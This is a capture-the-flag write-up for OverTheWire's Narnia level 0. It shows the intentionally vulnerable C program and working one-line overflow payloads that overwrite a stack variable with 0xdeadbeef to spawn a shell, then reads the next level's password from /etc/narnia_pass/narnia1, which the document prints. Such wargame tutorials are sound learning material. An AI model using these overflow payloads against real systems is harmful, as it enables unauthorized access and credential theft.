For this level, we need to do a buffer overflow attack to allow an injection shell command to get the password. To facilitate that, let's first look at the source code provided:
```
/*
   ...
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);
    
    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
From the source, we observe:

    - A buffer named buf of length 20 bytes.
    - A variable val initialized with the value 0x41414141.
    - A vulnerable scanf function reading 24 bytes of input, which allows for a buffer overflow.
    - The program checks if the value of val is 0xdeadbeef. If this condition is met, the program spawns a shell.

So, our main focus is the buffer overflow attack. To do this, we need to overflow the buffer (by inputting more than 20 bytes) in `buf` which then changes the overflowed values in `val`; 

Our objective is to overflow `buf` such that `val` is overwritten with the desired value `0xdeadbeef`.

Command:
```
narnia0@gibson:/narnia$ echo -e "$(printf 'A%.0s' {1..20})\xef\xbe\xad\xde cat /etc/narnia_pass/narnia1" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
```

Here, "\xef\xbe\xad\xde" represents 0xdeadbeef in little-endian byte ordering. We prepend this with 20 'A' characters to fill the buffer and overflow into the `val` variable.

Now we need to figure out why our shell terminal is not opened up or hanging. We can now get our password by creating a subshell with cat like so:
```
narnia0@gibson:/narnia$ (echo -e "$(printf 'A%.0s' {1..20})\xef\xbe\xad\xde"; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
cat /etc/narnia_pass/narnia1
eaa6AjYMBB
```